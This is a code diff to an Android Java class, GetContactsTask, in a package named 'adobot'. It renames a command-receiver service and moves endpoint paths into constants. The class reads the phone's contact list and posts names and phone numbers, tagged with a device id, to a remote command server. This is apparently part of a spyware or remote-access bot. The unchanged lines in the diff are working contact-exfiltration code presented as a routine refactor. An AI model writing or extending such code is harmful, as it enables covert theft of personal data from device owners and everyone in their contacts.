@@ -8,11 +8,12 @@ import android.provider.ContactsContract;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandReceiverService;
+import com.android.adobot.CommandService;
 import com.android.adobot.CommonParams;
 
 import java.util.HashMap;
 
+import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
 
@@ -25,7 +26,7 @@ public class GetContactsTask extends BaseTask {
     private CommonParams commonParams;
     private final String[] pers = {Manifest.permission.READ_CONTACTS};
 
-    public GetContactsTask(CommandReceiverService c) {
+    public GetContactsTask(CommandService c) {
         setContext(c);
         this.commonParams = new CommonParams(c);
     }
@@ -44,7 +45,7 @@ public class GetContactsTask extends BaseTask {
             contactP.put("uid", commonParams.getUid());
 
             Http req = new Http();
-            req.setUrl(commonParams.getServer() + "/notify");
+            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
             req.setMethod(HttpRequest.METHOD_POST);
             req.setParams(contactP);
             req.execute();
@@ -61,7 +62,7 @@ public class GetContactsTask extends BaseTask {
         startHm.put("device", commonParams.getDevice());
 
         Http startReq = new Http();
-        startReq.setUrl(commonParams.getServer() + "/notify");
+        startReq.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
         startReq.setMethod(HttpRequest.METHOD_POST);
         startReq.setParams(startHm);
         startReq.execute();
@@ -110,7 +111,7 @@ public class GetContactsTask extends BaseTask {
                 contactP.put("phone_numbers", phoneNumbers);
 
                 Http req = new Http();
-                req.setUrl(commonParams.getServer() + "/contacts");
+                req.setUrl(commonParams.getServer() + Constants.POST_CONTACTS_URL);
                 req.setMethod(HttpRequest.METHOD_POST);
                 req.setParams(contactP);
                 req.execute();
@@ -124,7 +125,7 @@ public class GetContactsTask extends BaseTask {
         endHm.put("device", commonParams.getDevice());
 
         Http endReq = new Http();
-        endReq.setUrl(commonParams.getServer() + "/notify");
+        endReq.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
         endReq.setMethod(HttpRequest.METHOD_POST);
         endReq.setParams(endHm);
         endReq.execute();
